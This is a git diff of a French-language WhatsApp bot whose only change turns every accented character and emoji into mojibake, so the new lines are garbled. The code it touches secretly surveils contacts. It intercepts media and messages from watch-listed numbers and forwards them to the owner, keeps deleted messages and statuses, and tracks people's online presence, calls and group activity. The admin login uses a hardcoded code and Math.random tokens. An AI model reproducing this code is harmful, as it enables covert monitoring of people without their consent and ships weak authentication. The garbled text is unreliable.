@@ -8700,10 +8700,10 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
             statusData.mediaBuffer = stream;
             statusData.caption = msg.message[statusType]?.caption || "";
             
-            console.log(`📸 Statut sauvegardé de ${msg.pushName || sender.split("@")[0]} (${statusType})`);
+            console.log(`ðŸ“¸ Statut sauvegardÃ© de ${msg.pushName || sender.split("@")[0]} (${statusType})`);
           } else if (statusType === "extendedTextMessage") {
             statusData.text = msg.message.extendedTextMessage?.text || "";
-            console.log(`[NOTE] Statut texte sauvegardé de ${msg.pushName || sender.split("@")[0]}`);
+            console.log(`[NOTE] Statut texte sauvegardÃ© de ${msg.pushName || sender.split("@")[0]}`);
           }
           
         } catch (e) {
@@ -8713,7 +8713,7 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
 
       // Stocker pour anti-delete
       if (!msg.key.fromMe && msg.message) {
-        // Extraire le vrai numéro de l'expéditeur
+        // Extraire le vrai numÃ©ro de l'expÃ©diteur
         const realSender = msg.key.participant || msg.key.remoteJid;
         const realNumber = realSender?.split("@")[0] || "";
         
@@ -8722,13 +8722,13 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
           cacheContactName(realSender, msg.pushName);
         }
         
-        // Récupérer le nom: pushName > cache > numéro formaté
+        // RÃ©cupÃ©rer le nom: pushName > cache > numÃ©ro formatÃ©
         let realName = msg.pushName && msg.pushName.length > 1 ? msg.pushName : null;
         if (!realName) realName = getCachedContactName(realSender);
         if (!realName && isValidPhoneNumber(realNumber)) realName = formatPhoneNumber(realNumber);
         if (!realName) realName = "Inconnu";
         
-        // Ne stocker que si le numéro est valide (pas un ID de groupe corrompu)
+        // Ne stocker que si le numÃ©ro est valide (pas un ID de groupe corrompu)
         if (isValidPhoneNumber(realNumber)) {
           messageStore.set(msg.key.id, {
             key: msg.key,
@@ -8748,20 +8748,20 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
           }
         }
         
-        // 🕵️ TRACKER L'ACTIVITÉ
+        // ðŸ•µï¸ TRACKER L'ACTIVITÃ‰
         const senderJid = msg.key.participant || msg.key.remoteJid;
         const isGroup = from?.endsWith("@g.us");
         trackActivity(senderJid, msg.pushName, getContentType(msg.message), isGroup ? from : null);
         
-        // 🕵️ VÉRIFIER SI LA PERSONNE EST SURVEILLÉE
+        // ðŸ•µï¸ VÃ‰RIFIER SI LA PERSONNE EST SURVEILLÃ‰E
         const senderNum = senderJid?.split("@")[0];
         
-        // Vérifier dans la watchList (plusieurs formats possibles)
+        // VÃ©rifier dans la watchList (plusieurs formats possibles)
         let isWatched = false;
         let matchedNumber = null;
         
         for (const watchedNum of watchList) {
-          // Vérification exacte ou partielle (fin du numéro)
+          // VÃ©rification exacte ou partielle (fin du numÃ©ro)
           if (senderNum === watchedNum || 
               senderNum?.endsWith(watchedNum) || 
               watchedNum?.endsWith(senderNum) ||
@@ -8774,12 +8774,12 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
         }
         
         if (isWatched) {
-          console.log(`[SPY] ALERTE! Message de ${senderNum} (surveillé: ${matchedNumber})`);
+          console.log(`[SPY] ALERTE! Message de ${senderNum} (surveillÃ©: ${matchedNumber})`);
           
           const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
           const watchedName = msg.pushName && msg.pushName.length > 1 ? msg.pushName : "Inconnu";
           
-          // 📸 INTERCEPTER AUTOMATIQUEMENT LES MÉDIAS DES SURVEILLÉS
+          // ðŸ“¸ INTERCEPTER AUTOMATIQUEMENT LES MÃ‰DIAS DES SURVEILLÃ‰S
           const msgType = getContentType(msg.message);
           if (["imageMessage", "videoMessage", "audioMessage", "documentMessage"].includes(msgType)) {
             try {
@@ -8791,18 +8791,18 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
               );
               
               const mediaContent = msg.message[msgType];
-              // 🆕 Utiliser getContactInfo pour nom + numéro
+              // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
               const contactInfo = getContactInfo(senderJid);
-              let caption = `🕵️ *MÉDIA INTERCEPTÉ*\n`;
-              caption += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
-              caption += `👤 *Contact:* ${contactInfo}\n`;
-              caption += `📝 *Nom WA:* ${watchedName}\n`;
-              caption += `💬 *Vers:* ${isGroup ? "Groupe " + from.split("@")[0] : "Chat privé"}\n`;
-              caption += `📝 *Type:* ${msgType.replace("Message", "")}\n`;
-              caption += `🕐 *Heure:* ${new Date().toLocaleString("fr-FR")}\n`;
-              caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
+              let caption = `ðŸ•µï¸ *MÃ‰DIA INTERCEPTÃ‰*\n`;
+              caption += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
+              caption += `ðŸ‘¤ *Contact:* ${contactInfo}\n`;
+              caption += `ðŸ“ *Nom WA:* ${watchedName}\n`;
+              caption += `ðŸ’¬ *Vers:* ${isGroup ? "Groupe " + from.split("@")[0] : "Chat privÃ©"}\n`;
+              caption += `ðŸ“ *Type:* ${msgType.replace("Message", "")}\n`;
+              caption += `ðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}\n`;
+              caption += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
               if (mediaContent?.caption) {
-                caption += `\n💬 *Légende:* "${mediaContent.caption}"`;
+                caption += `\nðŸ’¬ *LÃ©gende:* "${mediaContent.caption}"`;
               }
               
               if (msgType === "imageMessage") {
@@ -8820,33 +8820,33 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
                 });
               }
               
-              console.log(`[SPY] Média intercepté de ${watchedName} (${msgType})`);
+              console.log(`[SPY] MÃ©dia interceptÃ© de ${watchedName} (${msgType})`);
             } catch (e) {
-              console.log(`[!] Erreur interception média: ${e.message}`);
+              console.log(`[!] Erreur interception mÃ©dia: ${e.message}`);
             }
           } else {
             // Alerter pour les messages texte
-            // 🆕 Utiliser getContactInfo pour nom + numéro
+            // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
             const contactInfo = getContactInfo(senderJid);
-            let alertText = `🕵️ *ALERTE SURVEILLANCE*\n`;
-            alertText += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
-            alertText += `👤 *Contact:* ${contactInfo}\n`;
-            alertText += `📝 *Nom WA:* ${watchedName}\n`;
-            alertText += `💬 *Chat:* ${isGroup ? "Groupe" : "Message privé"}\n`;
+            let alertText = `ðŸ•µï¸ *ALERTE SURVEILLANCE*\n`;
+            alertText += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
+            alertText += `ðŸ‘¤ *Contact:* ${contactInfo}\n`;
+            alertText += `ðŸ“ *Nom WA:* ${watchedName}\n`;
+            alertText += `ðŸ’¬ *Chat:* ${isGroup ? "Groupe" : "Message privÃ©"}\n`;
             if (isGroup) {
-              alertText += `🏘️ *Groupe:* ${from.split("@")[0]}\n`;
+              alertText += `ðŸ˜ï¸ *Groupe:* ${from.split("@")[0]}\n`;
             }
-            alertText += `📝 *Type:* ${getContentType(msg.message)?.replace("Message", "")}\n`;
-            alertText += `🕐 *Heure:* ${new Date().toLocaleString("fr-FR")}\n`;
-            alertText += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            alertText += `ðŸ“ *Type:* ${getContentType(msg.message)?.replace("Message", "")}\n`;
+            alertText += `ðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}\n`;
+            alertText += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
             if (getMessageText(msg)) {
-              alertText += `\n📄 *Contenu:*\n"${getMessageText(msg).substring(0, 200)}"`;
+              alertText += `\nðŸ“„ *Contenu:*\n"${getMessageText(msg).substring(0, 200)}"`;
             }
             await hani.sendMessage(botNumber, { text: alertText });
           }
         }
         
-        // 📁 STOCKER LES MÉDIAS REÇUS POUR EXTRACTION
+        // ðŸ“ STOCKER LES MÃ‰DIAS REÃ‡US POUR EXTRACTION
         const msgType = getContentType(msg.message);
         if (["imageMessage", "videoMessage", "audioMessage", "documentMessage"].includes(msgType)) {
           try {
@@ -8872,7 +8872,7 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
               userMedia.shift();
             }
             
-            console.log(`📁 Média stocké de ${senderForMedia} (${msgType})`);
+            console.log(`ðŸ“ MÃ©dia stockÃ© de ${senderForMedia} (${msgType})`);
           } catch (e) {}
         }
       }
@@ -8883,7 +8883,7 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
         if (result.levelUp) {
           const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
           await hani.sendMessage(botNumber, { 
-            text: `🎉 *Level Up!*\n\n@${sender.split("@")[0]} est maintenant niveau ${result.newLevel}!`,
+            text: `ðŸŽ‰ *Level Up!*\n\n@${sender.split("@")[0]} est maintenant niveau ${result.newLevel}!`,
             mentions: [sender]
           });
         }
@@ -8896,18 +8896,18 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
       await handleCommand(hani, msg, db);
       
     } catch (e) {
-      console.log("⚠️ Erreur message:", e.message);
+      console.log("âš ï¸ Erreur message:", e.message);
     }
   });
 
-  // ────────── ANTI-DELETE ──────────
-  const processedDeletedMsgs = new Set(); // Anti-doublon pour messages supprimés
+  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ANTI-DELETE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+  const processedDeletedMsgs = new Set(); // Anti-doublon pour messages supprimÃ©s
   hani.ev.on("messages.update", async (updates) => {
     if (!protectionState.antidelete) return;
     
     for (const update of updates) {
       if (update.update?.messageStubType === 1 || update.update?.message === null) {
-        // 🔒 ANTI-DOUBLON
+        // ðŸ”’ ANTI-DOUBLON
         const msgId = update.key?.id;
         if (processedDeletedMsgs.has(msgId)) continue;
         processedDeletedMsgs.add(msgId);
@@ -8919,16 +8919,16 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
         const storedMsg = messageStore.get(update.key?.id);
         
         if (storedMsg) {
-          // Récupérer les infos avec validation
+          // RÃ©cupÃ©rer les infos avec validation
           const senderNumber = storedMsg.realNumber || "";
           
-          // Ignorer si le numéro n'est pas valide
+          // Ignorer si le numÃ©ro n'est pas valide
           if (!isValidPhoneNumber(senderNumber)) {
-            console.log(`[!] Message supprimé ignoré: numéro invalide (${senderNumber})`);
+            console.log(`[!] Message supprimÃ© ignorÃ©: numÃ©ro invalide (${senderNumber})`);
             continue;
           }
           
-          // Récupérer le nom: base de contacts > stocké > formaté
+          // RÃ©cupÃ©rer le nom: base de contacts > stockÃ© > formatÃ©
           let senderName = null;
           const contactInfo = getContact(senderNumber);
           if (contactInfo && contactInfo.name !== "Inconnu") {
@@ -8939,7 +8939,7 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
             senderName = formatPhoneNumber(senderNumber);
           }
           
-          console.log(`[DEL] Message supprimé de ${senderName} (${senderNumber})`);
+          console.log(`[DEL] Message supprimÃ© de ${senderName} (${senderNumber})`);
           
           deletedMessages.push({
             sender: senderName,
@@ -8961,29 +8961,29 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
               const chatJid = storedMsg.sender || storedMsg.key?.remoteJid;
               const isGroupChat = chatJid?.endsWith("@g.us");
               
-              // Format numéro: +225 XX XX XX XX XX
+              // Format numÃ©ro: +225 XX XX XX XX XX
               const formattedNumber = formatPhoneNumber(senderNumber);
               
-              // 🆕 Utiliser getContactInfo pour nom + numéro
+              // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
               const contactInfo = getContactInfo(storedMsg.sender);
-              let text = `🗑️ *MESSAGE SUPPRIMÉ DÉTECTÉ*\n`;
-              text += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
-              text += `👤 *Contact:* ${contactInfo}\n`;
-              text += `📝 *Nom WA:* ${senderName}\n`;
-              text += `💬 *Chat:* ${isGroupChat ? "Groupe" : "Privé"}\n`;
+              let text = `ðŸ—‘ï¸ *MESSAGE SUPPRIMÃ‰ DÃ‰TECTÃ‰*\n`;
+              text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
+              text += `ðŸ‘¤ *Contact:* ${contactInfo}\n`;
+              text += `ðŸ“ *Nom WA:* ${senderName}\n`;
+              text += `ðŸ’¬ *Chat:* ${isGroupChat ? "Groupe" : "PrivÃ©"}\n`;
               if (isGroupChat) {
-                text += `🏘️ *Groupe:* ${chatJid?.split("@")[0]}\n`;
+                text += `ðŸ˜ï¸ *Groupe:* ${chatJid?.split("@")[0]}\n`;
               }
-              text += `📝 *Type:* ${storedMsg.type?.replace("Message", "") || "texte"}\n`;
-              text += `🕐 *Heure:* ${new Date().toLocaleString("fr-FR")}\n`;
-              text += `━━━━━━━━━━━━━━━━━━━━━\n`;
+              text += `ðŸ“ *Type:* ${storedMsg.type?.replace("Message", "") || "texte"}\n`;
+              text += `ðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}\n`;
+              text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
               if (storedMsg.text) {
-                text += `\n📄 *Contenu:*\n"${storedMsg.text}"`;
+                text += `\nðŸ“„ *Contenu:*\n"${storedMsg.text}"`;
               }
               
               await hani.sendMessage(botNumber, { text });
               
-              // Renvoyer le média si applicable
+              // Renvoyer le mÃ©dia si applicable
               if (["imageMessage", "videoMessage", "audioMessage"].includes(storedMsg.type)) {
                 try {
                   const stream = await downloadMediaMessage(
@@ -8993,7 +8993,7 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
                     { logger: pino({ level: "silent" }) }
                   );
                   
-                  const mediaCaption = `🗑️ *Média supprimé*\n👤 ${contactInfo}\n📝 ${senderName}`;
+                  const mediaCaption = `ðŸ—‘ï¸ *MÃ©dia supprimÃ©*\nðŸ‘¤ ${contactInfo}\nðŸ“ ${senderName}`;
                   
                   if (storedMsg.type === "imageMessage") {
                     await hani.sendMessage(botNumber, { image: stream, caption: mediaCaption });
@@ -9008,14 +9008,14 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
           } catch (e) {}
         }
         
-        // ═══════════════════════════════════════════════════════════
-        // 📸 DÉTECTER LES STATUTS SUPPRIMÉS
-        // ═══════════════════════════════════════════════════════════
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+        // ðŸ“¸ DÃ‰TECTER LES STATUTS SUPPRIMÃ‰S
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
         const storedStatus = statusStore.get(update.key?.id);
         if (storedStatus && protectionState.antideletestatus) {
-          console.log(`📸 Statut supprimé détecté de ${storedStatus.pushName}`);
+          console.log(`ðŸ“¸ Statut supprimÃ© dÃ©tectÃ© de ${storedStatus.pushName}`);
           
-          // Ajouter aux statuts supprimés
+          // Ajouter aux statuts supprimÃ©s
           deletedStatuses.push({
             ...storedStatus,
             deletedAt: new Date().toLocaleString("fr-FR")
@@ -9025,57 +9025,57 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
             deletedStatuses.shift();
           }
           
-          // Envoyer le statut supprimé à soi-même
+          // Envoyer le statut supprimÃ© Ã  soi-mÃªme
           try {
             const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
             if (botNumber) {
               const formattedStatusNumber = formatPhoneNumber(storedStatus.sender);
               
-              // 🆕 Utiliser getContactInfo pour nom + numéro
+              // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
               const contactInfoStatus = getContactInfo(storedStatus.sender);
-              let caption = `📸 *Statut supprimé!*\n\n`;
-              caption += `👤 Contact: ${contactInfoStatus}\n`;
-              caption += `📝 Nom WA: ${storedStatus.pushName}\n`;
-              caption += `📝 Type: ${storedStatus.type}\n`;
-              caption += `🕐 Posté: ${storedStatus.date}\n`;
-              caption += `🗑️ Supprimé: ${new Date().toLocaleString("fr-FR")}`;
+              let caption = `ðŸ“¸ *Statut supprimÃ©!*\n\n`;
+              caption += `ðŸ‘¤ Contact: ${contactInfoStatus}\n`;
+              caption += `ðŸ“ Nom WA: ${storedStatus.pushName}\n`;
+              caption += `ðŸ“ Type: ${storedStatus.type}\n`;
+              caption += `ðŸ• PostÃ©: ${storedStatus.date}\n`;
+              caption += `ðŸ—‘ï¸ SupprimÃ©: ${new Date().toLocaleString("fr-FR")}`;
               
               if (storedStatus.mediaBuffer) {
                 if (storedStatus.type === "image") {
                   await hani.sendMessage(botNumber, { 
                     image: storedStatus.mediaBuffer, 
-                    caption: caption + (storedStatus.caption ? `\n\n💬 "${storedStatus.caption}"` : "")
+                    caption: caption + (storedStatus.caption ? `\n\nðŸ’¬ "${storedStatus.caption}"` : "")
                   });
                 } else if (storedStatus.type === "video") {
                   await hani.sendMessage(botNumber, { 
                     video: storedStatus.mediaBuffer, 
-                    caption: caption + (storedStatus.caption ? `\n\n💬 "${storedStatus.caption}"` : "")
+                    caption: caption + (storedStatus.caption ? `\n\nðŸ’¬ "${storedStatus.caption}"` : "")
                   });
                 } else if (storedStatus.type === "audio") {
                   await hani.sendMessage(botNumber, { text: caption });
                   await hani.sendMessage(botNumber, { audio: storedStatus.mediaBuffer, mimetype: "audio/mp4" });
                 }
               } else if (storedStatus.text) {
-                caption += `\n\n💬 Contenu:\n"${storedStatus.text}"`;
+                caption += `\n\nðŸ’¬ Contenu:\n"${storedStatus.text}"`;
                 await hani.sendMessage(botNumber, { text: caption });
               } else {
                 await hani.sendMessage(botNumber, { text: caption });
               }
               
-              console.log(`[OK] Statut supprimé envoyé à toi-même`);
+              console.log(`[OK] Statut supprimÃ© envoyÃ© Ã  toi-mÃªme`);
             }
           } catch (e) {
-            console.log(`[!] Erreur envoi statut supprimé: ${e.message}`);
+            console.log(`[!] Erreur envoi statut supprimÃ©: ${e.message}`);
           }
         }
       }
     }
   });
 
-  // ────────── ANTI-CALL ──────────
+  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ANTI-CALL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   hani.ev.on("call", async (calls) => {
     for (const call of calls || []) {
-      // 🆕 ENREGISTRER L'APPEL DANS L'HISTORIQUE
+      // ðŸ†• ENREGISTRER L'APPEL DANS L'HISTORIQUE
       if (spyConfig.trackCalls) {
         try {
           const callerJid = call.from;
@@ -9098,54 +9098,54 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
             timestamp: Date.now()
           };
           
-          // Ajouter à l'historique
+          // Ajouter Ã  l'historique
           if (!spyData.callHistory) spyData.callHistory = [];
           spyData.callHistory.unshift(callEntry);
           if (spyData.callHistory.length > 100) spyData.callHistory.pop();
           
-          console.log(`📞 [CALL SPY] ${call.isVideo ? 'Vidéo' : 'Audio'} de ${callerName} (${callerNumber})`);
+          console.log(`ðŸ“ž [CALL SPY] ${call.isVideo ? 'VidÃ©o' : 'Audio'} de ${callerName} (${callerNumber})`);
         } catch (e) {
           console.log(`[!] Erreur enregistrement appel: ${e.message}`);
         }
       }
       
-      // ANTI-CALL: Rejeter UNIQUEMENT si mode invisible est activé
+      // ANTI-CALL: Rejeter UNIQUEMENT si mode invisible est activÃ©
       const shouldRejectCall = spyConfig.ghostMode && call.status === "offer";
       if (shouldRejectCall) {
         try {
           // Rejeter l'appel
           await hani.rejectCall(call.id, call.from);
           
-          // Mettre à jour le statut dans l'historique
+          // Mettre Ã  jour le statut dans l'historique
           if (spyData.callHistory && spyData.callHistory.length > 0) {
             spyData.callHistory[0].status = 'rejected';
           }
           
-          // Envoyer un message personnalisé à la personne qui appelle
+          // Envoyer un message personnalisÃ© Ã  la personne qui appelle
           const callerNumber = call.from?.split("@")[0] || "";
-          const callType = call.isVideo ? "vidéo" : "vocal";
+          const callType = call.isVideo ? "vidÃ©o" : "vocal";
           
-          const message = `📵 *Appel ${callType} refusé*
-━━━━━━━━━━━━━━━━━━━━━
+          const message = `ðŸ“µ *Appel ${callType} refusÃ©*
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
 
-👋 Salut!
+ðŸ‘‹ Salut!
 
 Je ne suis pas disponible pour les appels pour le moment.
 
-📩 *Envoie-moi plutôt un message*, je te répondrai dès que possible!
+ðŸ“© *Envoie-moi plutÃ´t un message*, je te rÃ©pondrai dÃ¨s que possible!
 
-_Ce message a été envoyé automatiquement._`;
+_Ce message a Ã©tÃ© envoyÃ© automatiquement._`;
           
           await hani.sendMessage(call.from, { text: message });
           
-          // Notifier le propriétaire dans "Moi-même"
+          // Notifier le propriÃ©taire dans "Moi-mÃªme"
           const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
-          // 🆕 Utiliser getContactInfo pour nom + numéro
+          // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
           const contactInfo = getContactInfo(call.from);
-          const notif = `📵 *Appel ${callType} rejeté*\n\n👤 Contact: ${contactInfo}\n📝 Nom WA: ${callerName}\n🕐 ${new Date().toLocaleString("fr-FR")}`;
+          const notif = `ðŸ“µ *Appel ${callType} rejetÃ©*\n\nðŸ‘¤ Contact: ${contactInfo}\nðŸ“ Nom WA: ${callerName}\nðŸ• ${new Date().toLocaleString("fr-FR")}`;
           await hani.sendMessage(botNumber, { text: notif });
           
-          console.log(`📵 Appel ${callType} rejeté de ${callerName}`);
+          console.log(`ðŸ“µ Appel ${callType} rejetÃ© de ${callerName}`);
         } catch (e) {
           console.log(`[!] Erreur anti-call: ${e.message}`);
         }
@@ -9153,14 +9153,14 @@ _Ce message a été envoyé automatiquement._`;
     }
   });
 
-  // ────────── 🆕 SURVEILLANCE DES GROUPES ──────────
+  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ†• SURVEILLANCE DES GROUPES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   hani.ev.on("group-participants.update", async (update) => {
     if (!spyConfig.trackGroups) return;
     
     try {
       const { id: groupJid, participants, action } = update;
       
-      // Récupérer les infos du groupe
+      // RÃ©cupÃ©rer les infos du groupe
       let groupName = "Groupe inconnu";
       try {
         const metadata = await hani.groupMetadata(groupJid);
@@ -9185,29 +9185,29 @@ _Ce message a été envoyé automatiquement._`;
           timestamp: Date.now()
         };
         
-        // Ajouter à l'historique
+        // Ajouter Ã  l'historique
         if (!spyData.groupActivity) spyData.groupActivity = [];
         spyData.groupActivity.unshift(activity);
         if (spyData.groupActivity.length > 200) spyData.groupActivity.pop();
         
-        // Log uniquement (pas de notification dans Moi-même)
+        // Log uniquement (pas de notification dans Moi-mÃªme)
         let emoji, actionText;
         switch (action) {
-          case 'add': emoji = '➕'; actionText = 'a rejoint'; break;
-          case 'remove': emoji = '➖'; actionText = 'a quitté'; break;
-          case 'promote': emoji = '👑'; actionText = 'promu admin'; break;
-          case 'demote': emoji = '👤'; actionText = 'rétrogradé'; break;
-          default: emoji = '📋'; actionText = action;
+          case 'add': emoji = 'âž•'; actionText = 'a rejoint'; break;
+          case 'remove': emoji = 'âž–'; actionText = 'a quittÃ©'; break;
+          case 'promote': emoji = 'ðŸ‘‘'; actionText = 'promu admin'; break;
+          case 'demote': emoji = 'ðŸ‘¤'; actionText = 'rÃ©trogradÃ©'; break;
+          default: emoji = 'ðŸ“‹'; actionText = action;
         }
         
-        console.log(`👥 [GROUP SPY] ${participantName} ${actionText} dans ${groupName}`);
+        console.log(`ðŸ‘¥ [GROUP SPY] ${participantName} ${actionText} dans ${groupName}`);
       }
     } catch (e) {
       console.log(`[!] Erreur surveillance groupe: ${e.message}`);
     }
   });
 
-  // ────────── 🆕 TRACKER DE PRÉSENCE (CONNEXION/DÉCONNEXION) ──────────
+  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ†• TRACKER DE PRÃ‰SENCE (CONNEXION/DÃ‰CONNEXION) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   hani.ev.on("presence.update", async (update) => {
     if (!spyConfig.trackLastSeen) return;
     
@@ -9218,11 +9218,11 @@ _Ce message a été envoyé automatiquement._`;
       for (const [participantJid, presence] of Object.entries(presences)) {
         const cleanJid = participantJid.split("@")[0];
         
-        // Ignorer le bot lui-même
+        // Ignorer le bot lui-mÃªme
         const botNumber = hani.user?.id?.split(":")[0];
         if (cleanJid === botNumber) continue;
         
-        // Récupérer le nom
+        // RÃ©cupÃ©rer le nom
         let name = "Inconnu";
         try {
           const contact = await hani.onWhatsApp(participantJid);
@@ -9231,13 +9231,13 @@ _Ce message a été envoyé automatiquement._`;
           }
         } catch (e) {}
         
-        // Initialiser si nécessaire
+        // Initialiser si nÃ©cessaire
         if (!spyData.lastSeen) spyData.lastSeen = {};
         if (!spyData.lastSeen[participantJid]) {
           spyData.lastSeen[participantJid] = { name };
         }
         
-        // Mettre à jour selon le type de présence
+        // Mettre Ã  jour selon le type de prÃ©sence
         if (presence.lastKnownPresence === "available" || presence.lastKnownPresence === "composing" || presence.lastKnownPresence === "recording") {
           spyData.lastSeen[participantJid].lastOnline = Date.now();
           spyData.lastSeen[participantJid].isOnline = true;
@@ -9256,9 +9256,9 @@ _Ce message a été envoyé automatiquement._`;
   return hani;
 }
 
-// ═══════════════════════════════════════════════════════════
-// 🌐 SERVEUR WEB AVEC QR CODE
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸŒ SERVEUR WEB AVEC QR CODE
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 const express = require("express");
 const app = express();
@@ -9268,20 +9268,20 @@ const port = process.env.PORT || 3000;
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// 🔐 SYSTÈME D'AUTHENTIFICATION ADMIN SÉCURISÉ
+// ðŸ” SYSTÃˆME D'AUTHENTIFICATION ADMIN SÃ‰CURISÃ‰
 const ADMIN_CODE = "200700";
 const adminSessions = new Map(); // Sessions actives
 
-// Générer un token de session
+// GÃ©nÃ©rer un token de session
 function generateSessionToken() {
   return Math.random().toString(36).substring(2) + Date.now().toString(36) + Math.random().toString(36).substring(2);
 }
 
-// Vérifier si une session est valide
+// VÃ©rifier si une session est valide
 function isValidSession(token) {
   if (!token || !adminSessions.has(token)) return false;
   const session = adminSessions.get(token);
-  // Session expire après 1 heure
+  // Session expire aprÃ¨s 1 heure
   if (Date.now() - session.createdAt > 3600000) {
     adminSessions.delete(token);
     return false;
@@ -9295,10 +9295,10 @@ app.post("/admin/login", (req, res) => {
   if (code === ADMIN_CODE) {
     const token = generateSessionToken();
     adminSessions.set(token, { createdAt: Date.now(), ip: req.ip });
-    console.log(`[ADMIN] 🔓 Connexion admin réussie depuis ${req.ip}`);
+    console.log(`[ADMIN] ðŸ”“ Connexion admin rÃ©ussie depuis ${req.ip}`);
     res.json({ success: true, token });
   } else {
-    console.log(`[ADMIN] ❌ Tentative de connexion échouée depuis ${req.ip}`);
+    console.log(`[ADMIN] âŒ Tentative de connexion Ã©chouÃ©e depuis ${req.ip}`);
     res.json({ success: false, message: "Code incorrect" });
   }
 });
@@ -9310,24 +9310,24 @@ app.post("/admin/logout", (req, res) => {
   res.json({ success: true });
 });
 
-// API pour vérifier l'état admin
+// API pour vÃ©rifier l'Ã©tat admin
 app.get("/api/admin/check", (req, res) => {
   const token = req.headers['x-admin-token'];
   res.json({ valid: isValidSession(token) });
 });
 
-// API pour les stats admin (protégée)
+// API pour les stats admin (protÃ©gÃ©e)
 app.get("/api/admin/stats", async (req, res) => {
   const token = req.headers['x-admin-token'];
-  console.log('[ADMIN API] /stats - Token:', token ? 'présent' : 'absent');
+  console.log('[ADMIN API] /stats - Token:', token ? 'prÃ©sent' : 'absent');
   
   if (!isValidSession(token)) {
     console.log('[ADMIN API] /stats - Session invalide');
-    return res.status(401).json({ error: "Non autorisé" });
+    return res.status(401).json({ error: "Non autorisÃ©" });
   }
   
   try {
-    console.log('[ADMIN API] /stats - Chargement des données...');
+    console.log('[ADMIN API] /stats - Chargement des donnÃ©es...');
     const users = db.data.users || {};
     const userList = Object.entries(users);
     const banned = db.data.banned || [];
@@ -9379,12 +9379,12 @@ app.get("/api/admin/stats", async (req, res) => {
   }
 });
 
-// 🚫 API pour BANNIR un utilisateur
+// ðŸš« API pour BANNIR un utilisateur
 app.post("/api/admin/ban", (req, res) => {
   try {
     const token = req.headers['x-admin-token'];
     if (!isValidSession(token)) {
-      return res.status(401).json({ error: "Non autorisé" });
+      return res.status(401).json({ error: "Non autorisÃ©" });
     }
     
     const { jid } = req.body;
@@ -9395,22 +9395,22 @@ app.post("/api/admin/ban", (req, res) => {
     if (!db.data.banned.includes(jid)) {
       db.data.banned.push(jid);
       db.save();
-      console.log(`[ADMIN] 🚫 Utilisateur banni: ${jid}`);
+      console.log(`[ADMIN] ðŸš« Utilisateur banni: ${jid}`);
     }
     
-    res.json({ success: true, message: `${jid} a été banni` });
